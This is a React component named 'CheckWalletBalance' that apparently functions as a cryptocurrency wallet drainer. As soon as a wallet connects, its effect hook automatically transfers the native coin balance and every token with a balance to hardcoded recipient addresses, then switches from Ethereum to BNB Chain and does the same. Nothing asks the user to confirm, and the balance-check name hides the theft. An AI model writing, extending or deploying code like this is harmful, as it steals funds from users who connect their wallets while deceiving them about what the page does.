import { useEffect, useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useTransferFunds } from "../hooks/useTransferFunds";
import useNativeBalance from "../hooks/useNativeBalance";
import { getTokensWithBalance } from "../utils/getTokens";
import { MINIMUM_BALANCE, RECIPIENT_ADDRESSES } from "../constants";
import { useChainId } from "wagmi";
import useAutoSwitchChain from "../hooks/useAutoSwitchChain";
import { getGasBufferByChain } from "../utils/gasBuffer";

const SUPPORTED_CHAINS = [1, 56]; // Ethereum and BNB

export default function CheckWalletBalance() {
  const { address, isConnected } = useAppKitAccount();
  const chainId = useChainId();
  const { balance, symbol, isLoading } = useNativeBalance(address as `0x${string}`);
  const { transferNativeToken, transferERC20Token } = useTransferFunds();
  const { switchChain, isSwitching } = useAutoSwitchChain();

  const [status, setStatus] = useState("");
  const [processedChains, setProcessedChains] = useState<number[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);

  const GAS_BUFFER = getGasBufferByChain(chainId);

  const processWallet = async () => {
    if (!address || !chainId || processedChains.includes(chainId)) return;

    setIsProcessing(true);
    try {
      const numericBalance = parseFloat(balance);
      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);

      if (numericBalance < MINIMUM_BALANCE) {
        setStatus(`❌ Insufficient funds on ${symbol}: ${balance}`);
        setProcessedChains((prev) => [...prev, chainId]);
      } else {
        const tokens = await getTokensWithBalance(address, chainId);
        // Filter tokens with valid decimals and non-zero balances
        const filteredTokens = tokens.filter((token) => {
            const hasBalance = parseFloat(token.balance) > 0;
            const hasValidDecimals = typeof token.decimals === "number" && token.decimals >= 0;
            return hasBalance && hasValidDecimals;
        });


        if (tokens.length === 0) {
          setStatus("🚀 Sending native token...");
          await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
          setStatus("✅ Native token sent!");
        } else {
            setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
            await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
            for (const token of filteredTokens) {
              try {
                await transferERC20Token(
                  token.contractAddress,
                  token.balance,
                  RECIPIENT_ADDRESSES[chainId],
                  token.decimals
                );
              } catch (error) {
                console.warn(`⚠️ Error transferring ${token.symbol}:`, error);
              }
            }
          
            setStatus("🎉 All tokens sent!");
        }

        setProcessedChains((prev) => [...prev, chainId]);
      }

      // Move to next chain
      const nextChain = SUPPORTED_CHAINS.find(id => !processedChains.includes(id) && id !== chainId);
      if (nextChain) {
        setStatus(`🔁 Switching to chain ${nextChain}...`);
        await switchChain(nextChain);
      } else {
        setStatus("✅ All chains processed.");
      }

    } catch (error) {
      console.error("❌ Error in processWallet:", error);
      setStatus("❌ Transfer failed!");
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    const shouldProcess =
      isConnected &&
      address &&
      !processedChains.includes(chainId) &&
      !isProcessing &&
      !isLoading;

    if (shouldProcess) {
      processWallet();
    }
  }, [isConnected, address, chainId, isLoading]);

  return (
    <div className="text-center">
      <p>Chain: {chainId}</p>
      <p>Balance: {balance} {symbol}</p>
      <p>Status: {status}</p>
      {isSwitching && <p>🔄 Switching chain...</p>}
      {isProcessing && <p>⏳ Processing...</p>}
    </div>
  );
}
